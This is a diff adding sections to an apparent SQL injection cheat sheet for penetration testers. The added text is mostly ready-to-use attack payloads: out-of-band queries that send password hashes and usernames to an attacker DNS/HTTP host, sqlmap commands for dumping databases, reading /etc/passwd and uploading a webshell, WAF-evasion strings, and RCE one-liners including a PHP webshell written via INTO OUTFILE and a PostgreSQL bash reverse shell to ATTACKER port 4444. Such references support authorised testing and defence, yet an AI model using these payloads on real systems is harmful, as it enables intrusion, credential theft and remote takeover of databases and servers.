@@ -249,6 +249,32 @@ SELECT * FROM database_name.dbo.table_name;
 
 ---
 
+## Out-of-Band (OOB) SQLi
+
+When the injection is fully blind and time-based is too slow/unreliable, exfiltrate via DNS/HTTP to a collaborator. This is the fastest blind technique when egress is allowed.
+
+```sql
+-- MSSQL: DNS exfil via UNC path
+'; declare @q varchar(1024); set @q='\\'+(SELECT TOP 1 password FROM users)+'.ATTACKER.oast.fun\x'; exec master..xp_dirtree @q;--
+EXEC master..xp_fileexist '\\'+(SELECT @@version)+'.ATTACKER.oast.fun\x';
+
+-- Oracle: many OOB primitives
+SELECT UTL_INADDR.get_host_address((SELECT user FROM dual)||'.ATTACKER.oast.fun') FROM dual;
+SELECT UTL_HTTP.request('http://ATTACKER.oast.fun/'||(SELECT password FROM users WHERE rownum=1)) FROM dual;
+SELECT DBMS_LDAP.init((SELECT user FROM dual)||'.ATTACKER.oast.fun',80) FROM dual;
+-- XXE-based OOB (Oracle 11g+)
+SELECT extractvalue(xmltype('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://'||(SELECT user FROM dual)||'.ATTACKER.oast.fun/">%p;]>'),'/l') FROM dual;
+
+-- MySQL (Windows, secure_file_priv permitting): UNC LOAD_FILE
+SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.ATTACKER.oast.fun\\x'));
+
+-- PostgreSQL: COPY ... TO PROGRAM (superuser) or dblink
+COPY (SELECT '') TO PROGRAM 'nslookup $(whoami).ATTACKER.oast.fun';
+SELECT dblink_connect('host=ATTACKER user=x password='||(SELECT passwd FROM pg_shadow LIMIT 1)||' dbname=x');
+```
+
+---
+
 ## Automated Tools - SQLMap
 
 ```bash
@@ -261,17 +287,45 @@ sqlmap -u "http://TARGET/login.php" --data="username=admin&password=pass"
 # Cookie-based
 sqlmap -u "http://TARGET/page.php" --cookie="PHPSESSID=abc123"
 
+# Use a saved Burp request (best — captures headers/cookies/body)
+sqlmap -r request.txt --batch
+
+# Target a specific param, set DBMS, raise level/risk for deeper tests
+sqlmap -r request.txt -p id --dbms=mysql --level=5 --risk=3
+
+# JSON / nested body — mark the inject point with *
+sqlmap -u "http://TARGET/api" --data='{"id":"1*"}' --headers="Content-Type: application/json"
+
 # Dump specific database
 sqlmap -u "http://TARGET/page.php?id=1" -D database_name --dump
 
-# Dump all databases
+# Dump all / enumerate
 sqlmap -u "http://TARGET/page.php?id=1" --dump-all
+sqlmap -u "http://TARGET/page.php?id=1" --dbs --tables --columns --current-user --is-dba
 
-# OS shell
+# OS shell / SQL shell / file ops
 sqlmap -u "http://TARGET/page.php?id=1" --os-shell
+sqlmap -u "http://TARGET/page.php?id=1" --sql-shell
+sqlmap -u "http://TARGET/page.php?id=1" --file-read=/etc/passwd
+sqlmap -u "http://TARGET/page.php?id=1" --file-write=shell.php --file-dest=/var/www/html/s.php
 
-# Bypass WAF
-sqlmap -u "http://TARGET/page.php?id=1" --tamper=space2comment
+# Speed up blind extraction
+sqlmap -r request.txt --technique=BEUST --threads=10 --no-cast --hex
+
+# OOB exfil
+sqlmap -r request.txt --dns-domain=ATTACKER.oast.fun     # DNS exfil channel
+
+# WAF bypass — chain tamper scripts
+sqlmap -u "http://TARGET/?id=1" --tamper=space2comment,between,randomcase,charencode --random-agent
+sqlmap -u "http://TARGET/?id=1" --tamper=space2comment --proxy=http://127.0.0.1:8080
+```
+
+### Useful tamper scripts
+
+```text
+space2comment, space2hash, space2mysqlblank, modsecurityversioned, modsecurityzeroversioned,
+between, randomcase, charencode, charunicodeencode, equaltolike, greatest, percentage,
+apostrophemask, base64encode, versionedmorekeywords, multiplespaces, unionalltounion
 ```
 
 ---
@@ -447,3 +501,57 @@ Test special characters: ' " ; \ / * % _ [ ] ( ) & | ` ~ ! @ # $ ^ - + = { } < >
 4. Table names
 5. Column names
 6. Sensitive data (users, passwords, etc.)
+
+---
+
+## Advanced WAF Bypass (Modern)
+
+```sql
+-- MySQL scientific-notation / no-space union (beats many regex WAFs)
+1.e(union)select(1)
+0e1union(select(1),version())
+-- No-comma UNION (when ',' is filtered) via JOIN
+' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c-- -
+-- No-quotes string via hex / char
+' UNION SELECT 0x61646d696e-- -        -- 'admin'
+' UNION SELECT username FROM users WHERE id=0x31-- -
+-- Keyword-split with inline comments / versioned comments
+UN/**/ION SE/**/LECT     /*!50000UNION*//*!50000SELECT*/
+-- Logical-operator alternatives when AND/OR blocked
+' && '1'='1        ' || '1'='1        ' ^ '1'='1'      ' XOR true-- -
+-- Whitespace alternatives
+%09 %0a %0b %0c %0d %a0 /**/ ()  +  (e.g. SELECT()FROM)
+-- Bypass = filter
+' OR 1 LIKE 1-- -    ' OR 1 BETWEEN 1 AND 1-- -   ' OR id IN(1)-- -
+-- Double URL-encode + mixed case for ModSecurity CRS
+%2553ELECT  uNiOn  /*!UnIoN*/
+-- HPP (HTTP Parameter Pollution) to split the payload across dupes
+?id=1/*&id=*/UNION/*&id=*/SELECT...
+```
+
+---
+
+## Database-Specific RCE Quick Reference
+
+```sql
+-- MySQL: write webshell (needs FILE priv + secure_file_priv='' + known web path)
+' UNION SELECT '<?php system($_GET[0]);?>',2,3 INTO OUTFILE '/var/www/html/s.php'-- -
+-- MySQL UDF (sys_exec) if lib_mysqludf_sys present
+SELECT sys_exec('id');
+-- MSSQL: xp_cmdshell (see Command Execution above) / OLE automation / sp_OACreate
+-- PostgreSQL: COPY ... FROM PROGRAM (superuser) -> RCE
+COPY t FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"';
+CREATE TABLE cmd(o text); COPY cmd FROM PROGRAM 'id'; SELECT * FROM cmd;
+-- Oracle: DBMS_SCHEDULER / java stored procs for command execution
+```
+
+---
+
+## References
+
+- PortSwigger — SQL injection: https://portswigger.net/web-security/sql-injection
+- PortSwigger — SQLi cheat sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
+- PayloadsAllTheThings — SQL Injection: https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/
+- HackTricks — SQL injection: https://hacktricks.wiki/en/pentesting-web/sql-injection/index.html
+- sqlmap: https://github.com/sqlmapproject/sqlmap | tamper scripts: https://github.com/sqlmapproject/sqlmap/tree/master/tamper
+- OWASP SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
